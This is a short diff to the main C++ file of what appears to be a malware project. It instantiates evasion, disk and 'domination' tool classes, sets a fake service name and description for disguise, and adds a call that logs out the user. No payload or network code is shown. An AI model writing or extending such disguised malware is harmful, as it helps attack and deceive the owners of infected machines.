@@ -4,7 +4,7 @@
 #include "../DiskTools.h"
 #include "../UITools.h"
 #include "../DominationTools.h"
-
+#include "../SystemTools.h"
 using std::cout;
 
 
@@ -12,13 +12,14 @@ EvasionTools 	Evador;
 DiskTools	Disk;
 DominationTools Dominator;
 RuntimeTools	Runner;
+SystemTools	System;
 UITools		Interactor;
 
 int main(MALWARE_ENTRY){
 	cvinit(MALWARE_INIT);
 
 	SetMalwareMode(OFF);
-
+	System.LogOut();
 	SetMalwareFakeDescription("Mother");
 	SetMalwareFakeService("ayrebiayre");
 
